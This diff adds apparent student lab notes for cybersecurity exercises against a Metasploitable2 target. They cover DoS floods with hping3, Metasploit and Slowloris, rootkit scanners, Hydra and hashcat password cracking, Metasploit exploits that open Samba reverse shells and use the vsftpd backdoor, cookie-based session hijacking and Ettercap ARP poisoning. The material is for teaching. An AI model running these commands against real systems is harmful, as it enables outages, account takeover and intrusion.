@@ -1,0 +1,442 @@
+Exercise 5: Demonstrate DoS Attack
+Aim
+To perform Denial of Service (DoS) attack using different tools.
+Theory (Write Short in Exam)
+• DoS Attack: Single system floods target with requests
+• DDoS Attack: Multiple systems attack one target
+• Purpose: Make service unavailable
+Requirements
+• Kali Linux
+• Metasploitable2 (Target IP: 192.168.56.102)
+• Wireshark
+PART 1: Setup Metasploitable
+Step 1: Start Metasploitable
+Login:
+username: msfadmin
+password: msfadmin
+Step 2: Get IP Address
+ifconfig
+Example: 192.168.56.102
+Step 3: Open Website (Kali)
+http://192.168.56.102
+Verify target is running
+Step 4: Start Wireshark
+wireshark
+Select eth0 → Start capture
+PART 2: DoS using hping3
+Step 1: Open Root Terminal
+sudo su
+Step 2: Launch SYN Flood Attack
+hping3 -S 192.168.56.102 -a 192.168.56.200 -p 80 --flood
+Explanation:
+• -S → SYN packet
+• -a → spoofed IP
+• -p 80 → target port
+• --flood → continuous attack
+Step 3: Observe Traffic
+In Wireshark:
+• Huge packet flow
+• SYN flood visible
+Step 4: Check Website
+Website becomes slow or unavailable
+Step 5: Stop Attack
+Ctrl + C
+PART 3: DoS using Metasploit
+Step 1: Open Metasploit
+msfconsole
+Step 2: Search Module
+search syn flood
+Step 3: Use Module
+use auxiliary/dos/tcp/synflood
+Step 4: Show Options
+show options
+Step 5: Set Parameters
+set RHOSTS 192.168.56.102
+set SHOST 192.168.56.101
+Step 6: Run Attack
+run
+Step 7: Observe
+• Traffic increases
+• Website stops responding
+Step 8: Stop
+Ctrl + C
+PART 4: DoS using Slowloris
+Step 1: Clone Tool
+git clone https://github.com/gkbrk/slowloris.git
+Step 2: Navigate
+cd slowloris
+Step 3: Run Attack
+python3 slowloris.py -p 80 -s 1200 192.168.56.102
+Explanation:
+• -p 80 → target port
+• -s 1200 → number of sockets
+Step 4: Observe
+• Website becomes slow/unavailable
+Step 5: Stop
+Ctrl + C
+Result
+• Successfully performed DoS attack
+• Target system became unavailable
+Conclusion
+DoS attacks overload systems and deny service to legitimate users.
+
+Exercise 6: Install Rootkit Detectors
+Aim
+To install and analyze rootkit detection tools.
+Theory (Short)
+• Rootkit: Malware that gives root-level access
+• Hidden and difficult to detect
+• Used for spying and control
+Tools Used
+• rkhunter
+• chkrootkit
+PART 1: Install rkhunter
+Step 1: Switch to Root
+sudo su
+Step 2: Install Tool
+apt-get install rkhunter -y
+Step 3: Update Database
+rkhunter --update
+Step 4: Run Scan
+rkhunter --check
+Scans system for rootkits
+PART 2: Install chkrootkit
+Step 1: Install Tool
+apt-get install chkrootkit -y
+Step 2: View Help
+chkrootkit -h
+Step 3: Run Scan
+chkrootkit
+Checks for rootkits
+Result
+• System scanned for rootkits
+• No malicious rootkits detected (in normal case)
+Conclusion
+Rootkit detection tools help identify hidden malware and improve system security.
+1-Minute Revision
+DoS → hping3 / msf / slowloris
+rkhunter → scan rootkits
+chkrootkit → detect malware
+Exercise 7: Password Capturing & Cracking – Complete Execution
+PART 1: FTP Password Cracking using Hydra
+Step 1: Start Machines
+• Open Kali Linux
+• Start Metasploitable2
+Step 2: Get IP Address (Metasploitable)
+ifconfig
+Shows network details
+Note IP (example: 192.168.56.101)
+Step 3: Open Hydra Tool
+hydra
+Displays Hydra usage/help
+Step 4: Create Password List
+cd ~/Desktop
+nano passlist.txt
+Create wordlist file
+Add:
+123456
+admin
+msfadmin
+password
+Step 5: Run Hydra Attack
+hydra -l msfadmin -P ~/Desktop/passlist.txt -V ftp://192.168.56.101
+Explanation:
+• -l → username
+• -P → password list
+• -V → show attempts
+• ftp:// → target service
+Step 6: Output
+Correct password will be shown:
+login: msfadmin password: msfadmin
+PART 2: ZIP Password Cracking
+Step 1: Create File
+cd ~/Desktop
+nano sample.txt
+Step 2: Create ZIP with Password
+zip s1.zip -P abc sample.txt
+-P sets password (abc)
+Step 3: Check File
+ls
+Step 4: Convert ZIP to Hash
+zip2john s1.zip > hash1.txt
+Converts zip into crackable hash
+Step 5: View Hash
+cat hash1.txt
+Step 6: Edit Hash File
+nano hash1.txt
+Keep only:
+$pkzip$........:$pkzip$
+Step 7: Check Hash Mode
+hashcat -hh | grep -i zip
+Find correct mode (example: 17210)
+Step 8: Run Hashcat
+hashcat -a 0 -m 17210 hash1.txt passlist.txt
+Explanation:
+• -a 0 → dictionary attack
+• -m → hash type
+Step 9: Show Password
+hashcat --show hash1.txt
+PART 3: 7z Password Cracking
+Step 1: Install Required Tools
+sudo apt update
+sudo apt install p7zip-full john hashcat -y
+Step 2: Create Sample File
+cd ~/Desktop
+nano sample1.txt
+Step 3: Convert to 7z with Password
+7z a sample1.7z sample1.txt -pabc123
+Explanation:
+• a → add archive
+• -p → password
+Step 4: Convert 7z to Hash
+7z2john sample1.7z > hash3.txt
+Converts 7z → hash format
+Step 5: View Hash
+cat hash3.txt
+Step 6: Crack Password
+hashcat -a 0 -m 11600 hash3.txt passlist.txt
+11600 → 7z mode
+Step 7: Show Result
+hashcat --show hash3.txt
+(Optional) Using RockYou Wordlist (Better Results)
+Unzip Wordlist
+gunzip /usr/share/wordlists/rockyou.txt.gz
+Use it in Hashcat
+hashcat -a 0 -m 11600 hash3.txt /usr/share/wordlists/rockyou.txt
+FINAL OUTPUT
+• FTP password cracked using Hydra
+• ZIP password cracked using Hashcat
+• 7z password cracked successfully
+Important Notes (Exam Points)
+• Hydra → online attack tool
+• Hashcat → fastest password cracker
+• John → converts files to hash
+• Wordlist → key factor in cracking
+
+Exercise : Demonstrate Various Exploits of Metasploit
+Aim
+To perform exploitation on vulnerable services using Metasploit Framework.
+Requirements
+• Kali Linux
+• Metasploitable2
+• Host-only network
+PART 1: Basic Setup & Metasploit Commands
+Step 1: Start Metasploitable
+Login:
+username: msfadmin
+password: msfadmin
+Step 2: Get Target IP
+ifconfig
+Get IP (ex: 192.168.56.101)
+Step 3: Start Database (Kali)
+sudo service postgresql start
+sudo service postgresql status
+Start DB service
+Step 4: Open Metasploit
+msfconsole
+Launch framework
+Step 5: Basic Commands
+help # list commands
+clear # clear screen
+banner # show banner
+Step 6: View Modules
+show exploits
+show payloads
+List available modules
+Step 7: Scan Target
+nmap -sV 192.168.56.101
+Find open ports & services
+PART 2: Samba Exploit (Port 139)
+Step 1: Search Exploit
+search samba
+Find samba exploits
+Step 2: Use Exploit
+use exploit/multi/samba/usermap_script
+Load exploit module
+Step 3: Check Options
+show options
+Step 4: Set Target & Attacker
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.102
+set LPORT 4444
+Step 5: Set Payload
+set payload cmd/unix/reverse
+Reverse shell
+Step 6: Run Exploit
+exploit
+Step 7: Access System
+sessions
+sessions -i 1
+ls
+whoami
+Control target
+PART 3: FTP Exploit (vsftpd 2.3.4)
+Step 1: Scan Target
+nmap -sV 192.168.56.101
+Find FTP service
+Step 2: Search Exploit
+search vsftpd
+Step 3: Use Exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+Step 4: Set Target
+set RHOSTS 192.168.56.101
+Step 5: Run Exploit
+exploit
+Step 6: Access System
+ls
+pwd
+Shell access
+PART 4: RSH Exploit (Port 513)
+Step 1: Install Tool
+sudo apt install rsh-redone-client -y
+Install rlogin
+Step 2: Connect to Target
+rlogin 192.168.56.101
+Direct login
+Step 3: Execute Commands
+ls
+cd /
+Access system
+Payload Concept (Short for Exam)
+• Payload → malicious code executed after exploit
+• Reverse shell → target connects back
+• Bind shell → attacker connects to target
+Result
+• Successfully exploited Samba, FTP, and RSH services
+• Gained remote shell access to target system
+Conclusion
+Metasploit is used to identify and exploit vulnerabilities to test system security.
+Super Short Revision (1-minute before exam)
+Commands flow:
+ifconfig
+msfconsole
+nmap -sV IP
+search service
+use exploit/...
+set RHOSTS
+set LHOST
+set payload
+exploit
+sessions -i
+Here is your Exercise 9 in a clean, step-by-step format (with commands + small explanations) — perfect for
+exam writing + lab execution
+
+Exercise 9: Passive Scanning, Active Scanning, Cookies Extraction & Session Hijacking
+Aim
+To perform passive scanning, active scanning, cookies extraction, and session hijacking using security tools.
+Requirements
+• Kali Linux (192.168.56.101)
+• Metasploitable (192.168.56.102)
+• Wireshark, Nmap, Ettercap
+PART 1: Passive Scanning (Wireshark)
+Step 1: Open Wireshark
+wireshark
+Start packet capture tool
+Step 2: Select Interface
+• Choose eth0
+Start capturing packets
+Step 3: Apply Filter
+http
+Show only HTTP traffic
+Step 4: Generate Traffic
+• Open browser → visit any website
+Step 5: Analyze Packets
+• View request/response
+• Check headers and data
+Result
+Packets captured without interacting with target
+PART 2: Active Scanning (Nmap)
+Step 1: Scan Target
+nmap -sV 192.168.56.102
+Detect open ports & services
+Step 2: Detailed Scan (Optional)
+nmap -A 192.168.56.102
+OS + version detection
+Step 3: Port Scan
+nmap -p 1-1000 192.168.56.102
+Scan specific ports
+Result
+Active scanning interacts with target system
+PART 3: Cookies Extraction
+Step 1: Open Website
+• Go to vulnerable site (e.g., testfire.net)
+Step 2: Login
+• Username: admin
+• Password: admin
+Step 3: Open Developer Tools
+• Right-click → Inspect
+Step 4: Go to Cookies
+• Application → Storage → Cookies
+Step 5: Copy Cookie
+Copy JSESSIONID
+Step 6: Close Browser
+Step 7: Open New Browser
+• Open same website
+Step 8: Paste Cookie
+• Replace cookie value with copied one
+Step 9: Refresh Page
+Result
+Logged in without credentials
+PART 4: Session Hijacking (Ettercap MITM Attack)
+Step 1: Open Ettercap (as root)
+sudo ettercap -G
+Open GUI mode
+Step 2: Select Interface
+• Choose eth0
+Start sniffing
+Step 3: Scan Hosts
+• Menu → Hosts → Scan for Hosts
+Step 4: Add Targets
+• Hosts → Hosts List
+• Add:
+o Target 1 → 192.168.56.102
+o (If second machine exists, add it as Target 2)
+Step 5: Start MITM Attack
+• MITM → ARP Poisoning → OK
+Kali becomes Man-in-the-Middle
+Step 6: Start Wireshark
+wireshark
+Step 7: Apply Filter
+telnet
+Generate Telnet Traffic
+Step 8: Start Telnet Service (Metasploitable)
+sudo service openbsd-inetd start
+Step 9: Verify Port
+netstat -ant | grep 23
+Port 23 should be LISTEN
+Step 10: Connect from Kali
+telnet 192.168.56.102
+Step 11: Execute Commands
+whoami
+pwd
+ls
+Step 12: Create File
+echo "hello" > test.txt
+Step 13: Observe in Wireshark
+You can see:
+• Commands typed
+• Output
+• File contents
+Result
+• Traffic intercepted
+• Data captured successfully
+Concepts (Short for Exam)
+Passive Scanning
+• No interaction
+• Example: Wireshark
+Active Scanning
+• Direct interaction
+• Example: Nmap
+Session Hijacking
+• Taking control of session
+Cookies
+• Store session information
+Conclusion
+This experiment demonstrates how attackers can capture data using scanning techniques and hijack sessions
+in insecure networks.
+1-Minute Revision
+Wireshark → Passive scan
+Nmap → Active scan
+Cookies → Copy JSESSIONID
+Ettercap → MITM attack
+Telnet → Capture data
